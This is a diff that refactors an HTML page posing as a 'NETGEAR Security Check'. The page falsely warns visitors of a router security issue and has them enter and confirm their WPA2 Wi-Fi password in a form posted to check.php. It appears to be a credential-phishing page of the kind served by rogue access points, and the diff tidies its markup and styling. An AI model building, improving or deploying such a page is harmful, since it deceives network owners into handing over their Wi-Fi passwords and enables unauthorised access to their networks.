@@ -1,100 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <meta name="generator" content=
- "HTML Tidy for HTML5 for Linux version 5.2.0">
- <title>NETGEAR Security Check</title>
- <link rel="stylesheet" type="text/css" href="css/mainpage.css">
- <link rel="stylesheet" type="text/css" href="css/tabs.css">
- <link rel="stylesheet" type="text/css" href="css/button.css">
- <link rel="stylesheet" type="text/css" href="css/menu.css">
+<title>NETGEAR Security Check</title>
+<link rel="stylesheet" type="text/css" href="css/mainpage.css">
+<link rel="stylesheet" type="text/css" href="css/tabs.css">
+<link rel="stylesheet" type="text/css" href="css/button.css">
+<link rel="stylesheet" type="text/css" href="css/menu.css">
+<style>
+body {
+    padding: 0;
+    margin: 0;
+    background-color: #FFFFFF;
+    overflow: hidden;
+}
+.logo-img {
+    position: relative;
+    left: -7px;
+}
+.security-btn {
+    padding-left: 10px;
+}
+.content-cell {
+    background-color: #FFFFFF;
+    width: 200px;
+    font-size: 12px;
+    font-family: Arial, sans-serif;
+}
+.inner-cell {
+    background-color: #FFFFFF;
+    font-size: 12px;
+    font-family: Arial, sans-serif;
+}
+.form-container {
+    text-align: center;
+}
+.password-field {
+    margin: 5px 0;
+}
+</style>
 </head>
-<body style=
-"padding:0;margin:0;background-color:#FFFFFF;overflow:none" onload=
-"change_size();" onresize="change_size();">
- <table style="height:52px;width:100%;margin:0;padding:0"
- cellpadding="0" cellspacing="0" class="newtopframe">
-  <tr>
-   <td style="padding-left:20px"><img style=
-   "position:relative;left:-7px;" src=
-   "img/NewNetgeargenie.png"><br>
-   <span id="ModuleName"><b>Netgear Router</b></span></td>
-   <td style="text-align:right;padding-right:25px:">
-   <button type="button" value="BUTTON" onclick="gui_logout();"
-   name="logout" class="button-rule" style=
-   "padding-left:10px"><span class=
-   "roundleft_button">&nbsp;&nbsp;&nbsp;&nbsp;Security
-   Check</span><span class=
-   "roundright_button">&nbsp;&nbsp;&nbsp;&nbsp;</span></button><br style="line-height:8px">
-
-   <br></td>
-  </tr>
- </table>
- <table>
-  <tr>
-   <td>
-    <ul class="tabs" width="100%">
-     <li id="lang_menu_li" style=""></li>
-    </ul>
-   </td>
-  </tr>
-  <tr>
-   <td style=
-   "background-color:#FFFFFF;width:200px;font-size:12px;font-family:Arial;">
-    <div align="center">
-     <div align="center"></div>
-     <div class="pane" id="basic-pane" align="center">
-      <table id="basic-table">
-       <tr>
-        <td style=
-        "background-color:#FFFFFF;font-size:12px;font-family:Arial;">
-         <div font="Arial" class="basic-menu-eco-div" id=
-         "basic-eco">
-          <a href=
-          "http://kb.netgear.com/app/answers/detail/a_id/24244/~/understanding-netgear-led-symbols"
-          id="ECO_menu"><span>Click here for
-          support!</span></a>
-         </div>
+<body onload="change_size();" onresize="change_size();">
+<table cellpadding="0" cellspacing="0" class="newtopframe">
+    <tr>
+        <td>
+            <img class="logo-img" src="img/NewNetgeargenie.png" alt="NETGEAR Logo"><br>
+            <span id="ModuleName"><b>Netgear Router</b></span>
         </td>
-       </tr>
-      </table>
-     </div>
-     <div id="footer" class="footer"><img class="footer_img"
-     src="img/footer.gif"></div>
-     <table>
-      <tr>
-       <td><br>
-       <span id="ModuleName"><b><img src=
-       "img/error-icon.gif"> Your NETGEAR™ wireless router
-       detected a security issue. Please enter your wireless
-       security settings to proceed.</b></span></td>
-      </tr>
-      <tr>
-       <td>
-        <form action="check.php" method="post" align=
-        "center">
-         <br>
-         &nbsp;&nbsp;&nbsp;WPA2 Password: <input type=
-         "password" name="password1"><br>
-         Confirm Password: <input type="password" placeholder="Password" name=
-         "password2"><br>
-         <input type="submit" value="Send">
-        </form>
-       </td>
-      </tr>
-      <tr>
-       <td><br>
-       Note: If you have not changed your wireless settings,
-       the default password is printed on the bottom of the
-       router.<br>
-       <br>
-       <img src="img/label.png" alt="" ></td>
-      </tr>
-     </table>
-    </div>
-   </td>
-  </tr>
- </table>
+        <td>
+            <button type="button" value="BUTTON" onclick="gui_logout();" name="logout" class="button-rule security-btn">
+                <span class="roundleft_button">&nbsp;&nbsp;&nbsp;&nbsp;Security Check</span>
+                <span class="roundright_button">&nbsp;&nbsp;&nbsp;&nbsp;</span>
+            </button><br><br>
+        </td>
+    </tr>
+</table>
+<table>
+    <tr>
+        <td>
+            <ul class="tabs">
+                <li id="lang_menu_li"></li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td class="content-cell">
+            <div class="form-container">
+                <div class="pane" id="basic-pane">
+                    <table id="basic-table">
+                        <tr>
+                            <td class="inner-cell">
+                                <div class="basic-menu-eco-div" id="basic-eco">
+                                    <a href="http://kb.netgear.com/app/answers/detail/a_id/24244/~/understanding-netgear-led-symbols" id="ECO_menu">
+                                        <span>Click here for support!</span>
+                                    </a>
+                                </div>
+                            </td>
+                        </tr>
+                    </table>
+                </div>
+                <div id="footer" class="footer">
+                    <img class="footer_img" src="img/footer.gif" alt="Footer">
+                </div>
+                <table>
+                    <tr>
+                        <td><br>
+                            <span id="ModuleName">
+                                <b><img src="img/error-icon.gif" alt="Warning"> Your NETGEAR wireless router detected a security issue. Please enter your wireless security settings to proceed.</b>
+                            </span>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <form action="check.php" method="post" class="form-container">
+                                <br>
+                                <label for="password1">WPA2 Password:</label>
+                                <input type="password" id="password1" name="password1" placeholder="Enter password" class="password-field"><br>
+                                <label for="password2">Confirm Password:</label>
+                                <input type="password" id="password2" name="password2" placeholder="Confirm password" class="password-field"><br>
+                                <input type="submit" value="Send">
+                            </form>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><br>
+                            Note: If you have not changed your wireless settings, the default password is printed on the bottom of the router.<br><br>
+                            <img src="img/label.png" alt="Router label location">
+                        </td>
+                    </tr>
+                </table>
+            </div>
+        </td>
+    </tr>
+</table>
 </body>
 </html>
